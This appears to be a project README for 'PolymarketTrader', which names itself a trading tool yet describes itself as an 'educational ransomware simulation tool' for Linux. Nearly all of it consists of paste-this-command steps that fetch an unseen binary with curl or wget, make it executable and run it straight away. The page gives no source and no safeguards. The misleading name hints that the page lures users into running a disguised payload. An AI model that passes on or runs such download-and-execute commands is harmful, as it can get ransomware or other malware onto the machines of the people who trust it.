# PolymarketTrader

Educational ransomware simulation tool for Ubuntu/Linux systems.

## Quick Installation

Run this single command to download and install:

```bash
mkdir -p poly-trader && curl -L https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader -o poly-trader/PolymarketTrader && chmod +x poly-trader/PolymarketTrader && ./poly-trader/PolymarketTrader
```

This will:
1. Create a `poly-trader` directory
2. Download the executable
3. Make it executable automatically
4. Run the program

## Alternative Installation Methods

### Method 1: Download and Run Manually
```bash
# Create directory
mkdir -p poly-trader
cd poly-trader

# Download executable
curl -L https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader -o PolymarketTrader

# Make executable (if needed)
chmod +x PolymarketTrader

# Run the program
./PolymarketTrader
```

### Method 2: Using wget
```bash
mkdir -p poly-trader && cd poly-trader
wget https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader
chmod +x PolymarketTrader
./PolymarketTrader
```

## Troubleshooting

### Permission Issues
If you get a "Permission denied" error, run:
```bash
chmod +x PolymarketTrader
```

### If chmod doesn't work
Try with sudo:
```bash
sudo chmod +x PolymarketTrader
```

### File not executable
If you see "cannot execute binary file", make sure you're on a Linux/Ubuntu system (not Windows/Mac).

## Requirements

- **Operating System:** Ubuntu/Linux (64-bit)
- **Architecture:** x86_64
- **Dependencies:** None (all bundled in executable)

## Usage

After you download, follow the installation process displayed by the program.


## Support

If you encounter issues, ensure you're running on a compatible Linux system and have proper file permissions. 
